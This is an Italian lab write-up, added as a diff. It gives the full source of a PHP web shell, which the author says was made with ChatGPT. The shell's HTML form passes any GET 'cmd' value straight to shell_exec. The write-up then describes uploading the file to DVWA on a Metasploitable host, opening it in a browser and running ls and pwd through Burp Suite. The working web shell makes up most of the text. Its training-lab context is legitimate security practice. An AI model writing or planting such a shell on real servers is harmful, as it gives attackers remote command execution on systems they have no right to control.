@@ -1,0 +1,67 @@
+Con Chatgpt ho creato un codice con interfaccia grafica per eseguire comandi da remoto sulla macchina Metasploitable.
+
+Codice:
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Command Execution</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"], button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        pre {
+            background: #eee;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Remote Command Execution</h1>
+        <form method="GET">
+            <label for="cmd">Enter Command:</label>
+            <input type="text" id="cmd" name="cmd" placeholder="e.g., ls, whoami">
+            <button type="submit">Execute</button>
+        </form>
+        <div>
+            <h3>Output:</h3>
+            <pre>
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    // Dangerous: Executes command from input
+    echo htmlspecialchars(shell_exec($cmd));
+}
+?>
+            </pre>
+        </div>
+    </div>
+</body>
+</html>
+
+
+Ho caricato il file sulla pagina DVWA
+
+Ho eseguito il file da web browser tramite il collegamento:  http://192.168.50.101/dvwa/hackable/uploads/sophisticated_shell.php
+
+Ho avviato BurpSuite ed ho scansionato due comandi: ls, pwd
